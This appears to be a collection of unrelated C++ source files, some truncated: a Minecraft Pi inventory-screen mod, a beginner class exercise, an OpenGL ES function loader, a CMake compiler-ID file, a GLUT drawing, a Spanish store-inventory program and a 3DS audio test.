    "#include <GLES/gl.h>\n#include <SDL/SDL.h>\n\n#include <libreborn/libreborn.h>\n#include <symbols/minecraft.h>\n#include <mods/misc/misc.h>\n#include <media-layer/core.h>\n\n#include \"api.h\"\n\nstruct InventoryScreen : Screen {\n    int xSize = 176;\n    int ySize = 166;\n    Container *inventory = NULL;\n};\n\nbool hotbar_needs_update = false;\nint hotbar_offset = 0;\nvoid set_hotbar(Inventory *inv);\n\ntypedef void (*Font_drawShadow_t)(Font *font, const char *str, float x, float y, int color);\nFont_drawShadow_t Font_drawShadow = (Font_drawShadow_t) 0x25150;\ntypedef void (*ArmorScreen_renderPlayer_t)(Screen *_self, float x, float y);\nArmorScreen_renderPlayer_t ArmorScreen_renderPlayer = (ArmorScreen_renderPlayer_t) 0x29cd0;\n\nstatic void renderItem(Minecraft *mc, ItemInstance *item, int x, int y, float scale) {\n    // Item\n    ItemRenderer_renderGuiItem_one(mc->font, mc->textures, item, x, y, 1);\n    // Damage\n    ItemRenderer_renderGuiItemDecorations(item, x, y);\n    // Count\n    glPushMatrix();\n    glScalef(scale, scale, 1);\n    if (item->count != 1) {\n        std::string count = item->count < 100 ? std::to_string(item->count) : \"99+\";\n        Font_drawShadow(mc->font, count.c_str(), x / scale, y / scale, (item->count > 0) ? 0xFFF0F0F0 : 0xFFFF5555);\n    }\n    glPopMatrix();\n}\n\nstatic void InventoryScreen_render(Screen *_self, UNUSED int mx, UNUSED int my, UNUSED float param_1) {\n    InventoryScreen *self = (InventoryScreen *) _self;\n    //if (!self->minecraft || !self->minecraft->player || !self->minecraft->player->inventory) return;\n\n    const float scale = Gui_InvGuiScale * 2;\n    const int size_x = 255, size_y = 166;\n    const int cx = self->width / (2 * scale), cy = self->height / (2 * scale);\n    const int startx = std::max(0, cx - (size_x / 2)), starty = std::max(0, cy - (size_y / 2));\n\n    // BG\n    GuiComponent_fillGradient((GuiComponent *) self, 0, 0, self->width, starty + 88 * scale, 0xc0101010, 0xd0101010);\n\n    // UI\n    glPushMatrix();\n    glScalef(scale, scale, 1);\n    static std::string name = \"gui/inventory.png\";\n    Textures_loadAndBindTexture(self->minecraft->textures, &name);\n    GuiComponent_blit(\n        (GuiComponent *) self,\n        startx, starty,\n        0, 0,\n        size_x, size_y,\n        0, 0\n    );\n    // Hotbar arrow\n    GuiComponent_blit(\n        (GuiComponent *) self,\n        startx + 73, starty + 87 + (hotbar_offset * 18),\n        size_x + 33, size_y,\n        16, 16,\n        0, 0\n    );\n\n    // Render player\n    glPushMatrix();\n    glScalef(scale, scale, 1);\n    ArmorScreen_renderPlayer(_self, startx/scale + (8 + 8) / (scale / 2), starty/scale + (88 - 11) / (scale / 2));\n    glPopMatrix();\n\n    // Render items\n    Inventory *inventory = self->minecraft->player->inventory;\n    int xo = 88 + startx, yo = 88 + starty;\n    const int offset = 18;\n    int x = 0, y = 0;\n    int size = std::min(9 * 5, inventory->vtable->getContainerSize(inventory));\n    for (int i = 9; i < size; i++) {\n        ItemInstance *item = inventory->vtable->getItem(inventory, i);\n        if (item) {\n            renderItem(self->minecraft, item, xo + x * offset, yo + y * offset, scale);\n        }\n        x++;\n        if (x == 9) {\n            x = 0;\n            y++;\n        }\n    }\n    // Render armor\n    xo = 58 + startx;\n    y = x = 0;\n    for (int i = 0; i < 4; i++) {\n        ItemInstance *item = LocalPlayer_getArmor(self->minecraft->player, i);\n        if (item) {\n            renderItem(self->minecraft, item, xo + x * offset, yo + i * offset, scale);\n        }\n    }\n    glPopMatrix();\n}\n\nScreen_vtable *get_inventory_screen_vtable() {\n    static Screen_vtable *vtable = NULL;\n    if (!vtable) {\n        vtable = dup_Screen_vtable(Screen_vtable_base);\n        ALLOC_CHECK(vtable);\n        vtable->render = InventoryScreen_render;\n    }\n    return vtable;\n}\n\nHOOK_SINGLE_FROM_CALL(0x293a0, Touch_IngameBlockSelectionScreen *, Touch_IngameBlockSelectionScreen_constructor, (Touch_IngameBlockSelectionScreen *self)) {\n    Screen_constructor((Screen *) self);\n    self->vtable = (Touch_IngameBlockSelectionScreen_vtable *) get_inventory_screen_vtable();\n    return self;\n}\n\nstatic void *new_injection() {\n    return (void *) new InventoryScreen;\n}\n\n__attribute__((constructor)) static void init() {\n    overwrite_call((void *) 0x2943c, (void *) new_injection);\n    overwrite_call((void *) 0x29398, (void *) new_injection);\n    overwrite_call((void *) 0x29444, (void *) Touch_IngameBlockSelectionScreen_constructor_injection);\n}\n\n// Fix linked slots\nvoid set_hotbar(Inventory *inv) {\n    for (int i = 0; i < 9; i++) {\n        inv->linked_slots[i] = i + 9 * (hotbar_offset + 1);\n    }\n}\n\n// TODO: Clear inventory *without* default once item bar exists\nHOOK_FROM_CALL(0x8e7dc, void, Inventory_setupDefault, (Inventory *self)) {\n    Inventory_setupDefault_original(self);\n    set_hotbar(self);\n}\n",
    "\n/*\n- How to create a class\n- How to create a header file and corresponding .cc/.cpp file\n- How to create a constructor\n- How to overload a constructor\n- How to create a destructor\n- What you need a destructor for\n- How to delete an array created by new keyword\n- How to reach members of a class\n- How to call member functions of a class\n- How to reach members of a class through a pointer\n- How to call member functions of a class through a pointer\n*/\n\n#include <iostream>\n\n#include \"MyClass.h\"\n#include \"MyStack.h\"\n\nint main(int argc, char* argv[])\n{\n    // Exercise 1:\n    MyClass test1;\n    test1.print();\n    MyClass test2(1, 2);\n    test2.print();\n    test1.setX(20);\n    test1.print();\n    test1.setP(30);\n    test1.print();\n\n    // Exercise 2:\n    MyStack* stack = new MyStack();\n    std::cout << stack->is_empty() << \" \" << stack->size() << std::endl;\n    stack->push(3);\n    stack->push(10);\n    stack->push(1);\n    std::cout << stack->is_empty() << \" \" << stack->size() << std::endl;\n    stack->print();\n    std::cout << stack->sum() << std::endl;\n    delete stack;\n    \n    return 0;\n}\n",
    "// MIT License\n// \n// Copyright (C) 2018-2024, Tellusim Technologies Inc. https://tellusim.com/\n// \n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n// \n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include <core/TellusimLog.h>\n#include <platform/TellusimContext.h>\n\n#include \"../include/TellusimGLES.h\"\n\n/*\n */\nnamespace Tellusim {\n\t\n\t/*\n\t */\n\tnamespace GLES {\n\t\t\n\t\t/*\n\t\t */\n\t\tbool init() {\n\t\t\t\n\t\t\t// function address\n\t\t\t#define GET_ADDRESS(TYPE, NAME) { \\\n\t\t\t\tNAME = (TYPE)GLESContext::getProcAddress(#NAME); \\\n\t\t\t\tif(NAME == nullptr && is_core) { \\\n\t\t\t\t\tTS_LOGF(Error, \"GLES::init(): can't get %s function\\n\", #NAME); \\\n\t\t\t\t\treturn false; \\\n\t\t\t\t} \\\n\t\t\t}\n\t\t\t\n\t\t\t// core functions\n\t\t\tbool is_core = true;\n\t\t\t\n\t\t\t// OpenGLES 20 functions\n\t\t\tGET_ADDRESS(PFNGLACTIVETEXTUREPROC, glActiveTexture)\n\t\t\tGET_ADDRESS(PFNGLATTACHSHADERPROC, glAttachShader)\n\t\t\tGET_ADDRESS(PFNGLBINDATTRIBLOCATIONPROC, glBindAttribLocation)\n\t\t\tGET_ADDRESS(PFNGLBINDBUFFERPROC, glBindBuffer)\n\t\t\tGET_ADDRESS(PFNGLBINDFRAMEBUFFERPROC, glBindFramebuffer)\n\t\t\tGET_ADDRESS(PFNGLBINDRENDERBUFFERPROC, glBindRenderbuffer)\n\t\t\tGET_ADDRESS(PFNGLBINDTEXTUREPROC, glBindTexture)\n\t\t\tGET_ADDRESS(PFNGLBLENDCOLORPROC, glBlendColor)\n\t\t\tGET_ADDRESS(PFNGLBLENDEQUATIONPROC, glBlendEquation)\n\t\t\tGET_ADDRESS(PFNGLBLENDEQUATIONSEPARATEPROC, glBlendEquationSeparate)\n\t\t\tGET_ADDRESS(PFNGLBLENDFUNCPROC, glBlendFunc)\n\t\t\tGET_ADDRESS(PFNGLBLENDFUNCSEPARATEPROC, glBlendFuncSeparate)\n\t\t\tGET_ADDRESS(PFNGLBUFFERDATAPROC, glBufferData)\n\t\t\tGET_ADDRESS(PFNGLBUFFERSUBDATAPROC, glBufferSubData)\n\t\t\tGET_ADDRESS(PFNGLCHECKFRAMEBUFFERSTATUSPROC, glCheckFramebufferStatus)\n\t\t\tGET_ADDRESS(PFNGLCLEARPROC, glClear)\n\t\t\tGET_ADDRESS(PFNGLCLEARCOLORPROC, glClearColor)\n\t\t\tGET_ADDRESS(PFNGLCLEARDEPTHFPROC, glClearDepthf)\n\t\t\tGET_ADDRESS(PFNGLCLEARSTENCILPROC, glClearStencil)\n\t\t\tGET_ADDRESS(PFNGLCOLORMASKPROC, glColorMask)\n\t\t\tGET_ADDRESS(PFNGLCOMPILESHADERPROC, glCompileShader)\n\t\t\tGET_ADDRESS(PFNGLCOMPRESSEDTEXIMAGE2DPROC, glCompressedTexImage2D)\n\t\t\tGET_ADDRESS(PFNGLCOMPRESSEDTEXSUBIMAGE2DPROC, glCompressedTexSubImage2D)\n\t\t\tGET_ADDRESS(PFNGLCOPYTEXIMAGE2DPROC, glCopyTexImage2D)\n\t\t\tGET_ADDRESS(PFNGLCOPYTEXSUBIMAGE2DPROC, glCopyTexSubImage2D)\n\t\t\tGET_ADDRESS(PFNGLCREATEPROGRAMPROC, glCreateProgram)\n\t\t\tGET_ADDRESS(PFNGLCREATESHADERPROC, glCreateShader)\n\t\t\tGET_ADDRESS(PFNGLCULLFACEPROC, glCullFace)\n\t\t\tGET_ADDRESS(PFNGLDELETEBUFFERSPROC, glDeleteBuffers)\n\t\t\tGET_ADDRESS(PFNGLDELETEFRAMEBUFFERSPROC, glDeleteFramebuffers)\n\t\t\tGET_ADDRESS(PFNGLDELETEPROGRAMPROC, glDeleteProgram)\n\t\t\tGET_ADDRESS(PFNGLDELETERENDERBUFFERSPROC, glDeleteRenderbuffers)\n\t\t\tGET_ADDRESS(PFNGLDELETESHADERPROC, glDeleteShader)\n\t\t\tGET_ADDRESS(PFNGLDELETETEXTURESPROC, glDeleteTextures)\n\t\t\tGET_ADDRESS(PFNGLDEPTHFUNCPROC, glDepthFunc)\n\t\t\tGET_ADDRESS(PFNGLDEPTHMASKPROC, glDepthMask)\n\t\t\tGET_ADDRESS(PFNGLDEPTHRANGEFPROC, glDepthRangef)\n\t\t\tGET_ADDRESS(PFNGLDETACHSHADERPROC, glDetachShader)\n\t\t\tGET_ADDRESS(PFNGLDISABLEPROC, glDisable)\n\t\t\tGET_ADDRESS(PFNGLDISABLEVERTEXATTRIBARRAYPROC, glDisableVertexAttribArray)\n\t\t\tGET_ADDRESS(PFNGLDRAWARRAYSPROC, glDrawArrays)\n\t\t\tGET_ADDRESS(PFNGLDRAWELEMENTSPROC, glDrawElements)\n\t\t\tGET_ADDRESS(PFNGLENABLEPROC, glEnable)\n\t\t\tGET_ADDRESS(PFNGLENABLEVERTEXATTRIBARRAYPROC, glEnableVertexAttribArray)\n\t\t\tGET_ADDRESS(PFNGLFINISHPROC, glFinish)\n\t\t\tGET_ADDRESS(PFNGLFLUSHPROC, glFlush)\n\t\t\tGET_ADDRESS(PFNGLFRAMEBUFFERRENDERBUFFERPROC, glFramebufferRenderbuffer)\n\t\t\tGET_ADDRESS(PFNGLFRAMEBUFFERTEXTURE2DPROC, glFramebufferTexture2D)\n\t\t\tGET_ADDRESS(PFNGLFRONTFACEPROC, glFrontFace)\n\t\t\tGET_ADDRESS(PFNGLGENBUFFERSPROC, glGenBuffers)\n\t\t\tGET_ADDRESS(PFNGLGENERATEMIPMAPPROC, glGenerateMipmap)\n\t\t\tGET_ADDRESS(PFNGLGENFRAMEBUFFERSPROC, glGenFramebuffers)\n\t\t\tGET_ADDRESS(PFNGLGENRENDERBUFFERSPROC, glGenRenderbuffers)\n\t\t\tGET_ADDRESS(PFNGLGENTEXTURESPROC, glGenTextures)\n\t\t\tGET_ADDRESS(PFNGLGETACTIVEATTRIBPROC, glGetActiveAttrib)\n\t\t\tGET_ADDRESS(PFNGLGETACTIVEUNIFORMPROC, glGetActiveUniform)\n\t\t\tGET_ADDRESS(PFNGLGETATTACHEDSHADERSPROC, glGetAttachedShaders)\n\t\t\tGET_ADDRESS(PFNGLGETATTRIBLOCATIONPROC",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__ibmxl__) && defined(__clang__)\n# define COMPILER_ID \"XLClang\"\n# define COMPILER_VERSION_MAJOR DEC(__ibmxl_version__)\n# define COMPILER_VERSION_MINOR DEC(__ibmxl_release__)\n# define COMPILER_VERSION_PATCH DEC(__ibmxl_modification__)\n# define COMPILER_VERSION_TWEAK DEC(__ibmxl_ptf_fix_level__)\n\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP_",
    "/*\r\n * OpenGL.cpp\r\n *\r\n *  Created on: Abril 04, 2024\r\n *      Author: guiil_000\r\n */\r\n\r\n#include <GL/glut.h>\r\n#include <iostream>\r\n\r\nvoid Desenha(void) {\r\n\tglClear(GL_COLOR_BUFFER_BIT);\r\n\r\n\tgluOrtho2D(-5, 6, -4, 8);\r\n\r\n\tglBegin(GL_QUADS);\r\n\tfor (int i = -2; i <= 3; i++) {\r\n\t\tglColor3f(1, i, 0);\r\n\t\tglVertex2f(i, 2);\r\n\t\tglVertex2f(i, 4);\r\n\t}\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.6, 0.2, 0.8);\r\n\tglVertex2f(-4, 4);\r\n\tglVertex2f(5, 4);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.59, 0.29, 0);\r\n\tglVertex2f(-4, 4.5);\r\n\tglVertex2f(-4, -4);\r\n\tglVertex2f(-3.5, -4);\r\n\tglVertex2f(-3.5, 4.5);\r\n\r\n\tglVertex2f(5, 4.5);\r\n\tglVertex2f(5, -4);\r\n\tglVertex2f(4.5, -4);\r\n\tglVertex2f(4.5, 4.5);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.72, 0.45, 0.2);\r\n\tglVertex2f(-1, -4);\r\n\tglVertex2f(0, -3);\r\n\tglVertex2f(1, -3);\r\n\tglVertex2f(2, -4);\r\n\tglEnd();\r\n\r\n\tglPointSize(7.0);\r\n\tglBegin(GL_POINTS);\r\n\tglColor3f(0.5, 0.5, 0.5);\r\n\tglVertex2f(0, 0);\r\n\tglVertex2f(0.5, -1);\r\n\tglVertex2f(0, -1);\r\n\tglVertex2f(0, -2);\r\n\tglVertex2f(-0.5, -2);\r\n\tglVertex2f(-0.5, -3);\r\n\tglVertex2f(1.5, -3);\r\n\tglVertex2f(1.5, -2);\r\n\tglVertex2f(1.5, -1);\r\n\tglVertex2f(1, -2);\r\n\tglVertex2f(0.5, -2);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.53, 0.81, 0.98);\r\n\tglVertex2f(0, 5);\r\n\tglVertex2f(0.3, 6);\r\n\r\n\tglVertex2f(1, 2);\r\n\tglVertex2f(1.3, 3);\r\n\r\n\tglVertex2f(2, 1);\r\n\tglVertex2f(2.3, 2);\r\n\r\n\tglVertex2f(-1, -1);\r\n\tglVertex2f(-1.3, -2);\r\n\r\n\tglVertex2f(-2, -3);\r\n\tglVertex2f(-2.3, -4);\r\n\r\n\tglVertex2f(-4, 0);\r\n\tglVertex2f(-4.3, -1);\r\n\r\n\tglVertex2f(1, -1);\r\n\tglVertex2f(1.3, 0);\r\n\r\n\tglVertex2f(2, -3);\r\n\tglVertex2f(2.3, -2);\r\n\r\n\tglVertex2f(4, -4);\r\n\tglVertex2f(4.3, -3);\r\n\r\n\tglVertex2f(5, -2);\r\n\tglVertex2f(5.3, -1);\r\n\r\n\tglVertex2f(4, 3);\r\n\tglVertex2f(4.3, 4);\r\n\r\n\tglVertex2f(3, 2);\r\n\tglVertex2f(3.3, 3);\r\n\r\n\tglVertex2f(-3, 3);\r\n\tglVertex2f(-3.3, 2);\r\n\r\n\tglVertex2f(-4, 5);\r\n\tglVertex2f(-4.3, 4);\r\n\r\n\tglVertex2f(-2, 1);\r\n\tglVertex2f(-2.3, 0);\r\n\r\n\tglVertex2f(0, 1);\r\n\tglVertex2f(0.3, 2);\r\n\r\n\tglVertex2f(-0.3, 3);\r\n\tglVertex2f(-.6, 2);\r\n\r\n\tglVertex2f(-2, 5);\r\n\tglVertex2f(-2.3, 4);\r\n\r\n\tglVertex2f(-3, 6);\r\n\tglVertex2f(-3.3, 5);\r\n\r\n\r\n\tglVertex2f(3, 5);\r\n\tglVertex2f(3.3, 6);\r\n\r\n\r\n\tglVertex2f(2, 6);\r\n\tglVertex2f(2.3, 7);\r\n\r\n\r\n\tglVertex2f(-1, 7);\r\n\tglVertex2f(-1.3, 6);\r\n\r\n\r\n\tglVertex2f(4, 6);\r\n\tglVertex2f(4.3, 7);\r\n\r\n\tglVertex2f(3, -2);\r\n\tglVertex2f(3.3, -1);\r\n\r\n\tglEnd();\r\n\r\n\tglFlush();\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n\tglutInit(&argc, argv);\r\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\r\n\tglutInitWindowSize(1000, 500);\r\n\tglutInitWindowPosition(120, 150);\r\n\tglutCreateWindow(\"Sad Junina\");\r\n\tglutDisplayFunc(Desenha);\r\n\tglutMainLoop();\r\n}\r\n\r\n",
    "#include <iostream>\n#include <cctype>\n#include \"Tienda.h\"\n#include \"Producto.h\"\n#include \"ProductoAlimenticio.h\"\n#include \"ProductoElectronico.h\"\n#include <sstream>\n\nbool contieneSoloLetras(const std::string& str) {\n    for (char c : str) {\n        if (!std::isalpha(c)) {\n            return false;\n        }\n    }\n    return true;\n}\nbool contieneSoloDigitos(const std::string& str) {\n    for (char c : str) {\n        if (!std::isdigit(c)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nbool esNumeroDecimal(const std::string& str) {\n    std::istringstream iss(str);\n    double temp;\n    iss >> std::noskipws >> temp;\n    return iss.eof() && !iss.fail();\n}\n\n\nint main() {\n    Tienda tienda;\n\n    int opcion;\n    do {\n        //Menu Principal del programa\n        std::cout << \"\\n=== MENU ===\" << std::endl;\n        std::cout << \"1. Agregar Producto\" << std::endl;\n        std::cout << \"2. Eliminar Producto\" << std::endl;\n        std::cout << \"3. Buscar Producto\" << std::endl;\n        std::cout << \"4. Mostrar Inventario\" << std::endl;\n        std::cout << \"5. Filtrar Productos por Precio\" << std::endl;\n        std::cout << \"6. Copiar Producto\" << std::endl;\n        std::cout << \"7. Salir\" << std::endl;\n        std::cout << \"Seleccione una opcion:\\n \";\n        std::cin >> opcion;\n\n        switch (opcion) {\n            case 1: {\n                //Agregar producto\n                std::string idStr;\n                int id;\n                std::string nombre;\n                std::string precioStr;\n                double precio;\n                int stock;\n                std::string fechaCaducidad;\n                std::string modelo;\n                int tipoProducto;\n                //Menu de tipo de productos\n                do {\n                    std::cout << \"Ingrese el tipo de producto\\n 1-Producto\\n 2-Producto Alimenticio\\n 3-Producto Electronico\\nSeleccione una opcion:\\n \";\n                    std::cin >> tipoProducto;\n                } while (tipoProducto < 1 || tipoProducto > 3);\n                //Pedir al usuario q ingrese el ID del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el ID del producto:\\n \";\n                    std::cin >> idStr;\n                    if (!contieneSoloDigitos(idStr)) {\n                        std::cerr << \"El ID del producto debe contener solo digitos.\" << std::endl;\n                    }\n                } while (!contieneSoloDigitos(idStr));\n\n                // Convertir la cadena de ID a entero\n                id = std::stoi(idStr);\n\n                // Pedir al usuario q ingrese el nombre hasta q contenga solo letras\n                do {\n                    std::cout << \"Ingrese el nombre del producto:\\n \";\n                    std::cin >> nombre;\n                    if (!contieneSoloLetras(nombre)) {\n                        std::cerr << \"El nombre del producto debe contener solo letras.\" << std::endl;\n                    }\n                } while (!contieneSoloLetras(nombre));\n                //Pedir al usuario q ingrese el precio del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el precio del producto:\\n \";\n                    std::cin >> precioStr;\n                    if (!esNumeroDecimal(precioStr)) {\n                        std::cerr << \"El precio del producto debe ser un numero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(precioStr));\n                precio = std::stod(precioStr); // Convertir la cadena de precio a double\n                //Pedir al usuario q ingrese el stock del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el stock del producto:\\n \";\n                    std::cin >> stock;\n                    if (!esNumeroDecimal(std::to_string(stock))) {\n                        std::cerr << \"El stock del producto debe ser un n\u00famero entero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(std::to_string(stock)));\n\n                if (tipoProducto == 2) {\n                    std::cout << \"Ingrese la fecha de caducidad del producto alimenticio: \";\n                    std::cin >> fechaCaducidad;\n                    tienda.agregarProducto(new ProductoAlimenticio(id, nombre, precio, stock, fechaCaducidad));\n                } else if (tipoProducto == 3) {\n                    std::cout << \"Ingrese el modelo del producto electronico: \";\n                    std::cin >> modelo;\n                    tienda.agregarProducto(new ProductoElectronico(id, nombre, precio, stock, modelo));\n                } else {\n                    tienda.agregarProducto(new Producto(id, nombre, precio, stock));\n                }\n\n                break;\n            }\n            case 2: {\n                int id;\n                std::cout << \"Ingrese el ID del producto a eliminar:\\n \";\n                std::cin >> id;\n                tienda.eliminarProducto(id);\n            ",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n\n#include <3ds.h>\n\n#include \"audio.h\"\n\n// High frequency square wave, PCM16\nvoid fillBuffer(u32 *audio_buffer, size_t size) {\n    for (size_t i = 0; i < size; i++) {\n        u32 data = (i % 2 == 0 ? 0x1000 : 0x2000);\n        audio_buffer[i] = (data<<16) | (data&0xFFFF);\n    }\n\n    DSP_FlushDataCache(audio_buffer, size);\n}\n\nvoid waitForKey() {\n    while (aptMainLoop()) {\n        gfxSwapBuffers();\n        gfxFlushBuffers();\n        gspWaitForVBlank();\n\n        hidScanInput();\n        u32 kDown = hidKeysDown();\n\n        if (kDown)\n            break;\n    }\n}\n\nint main(int argc, char **argv) {\n    gfxInitDefault();\n\n    PrintConsole botScreen;\n    PrintConsole topScreen;\n\n    consoleInit(GFX_TOP, &topScreen);\n    consoleInit(GFX_BOTTOM, &botScreen);\n    consoleSelect(&topScreen);\n\n    constexpr size_t NUM_SAMPLES = 160*200;\n    u32 *audio_buffer = (u32*)linearAlloc(NUM_SAMPLES * sizeof(u32));\n    fillBuffer(audio_buffer, NUM_SAMPLES);\n\n    AudioState state;\n    {\n        auto dspfirm = loadDspFirmFromFile();\n        if (!dspfirm) {\n            printf(\"Couldn't load firmware\\n\");\n            goto end;\n        }\n        auto ret = audioInit(*dspfirm);\n        if (!ret) {\n            printf(\"Couldn't init audio\\n\");\n            goto end;\n        }\n        state = *ret;\n    }\n\n    {\n        const s16 b0 = 0.8 * (1 << 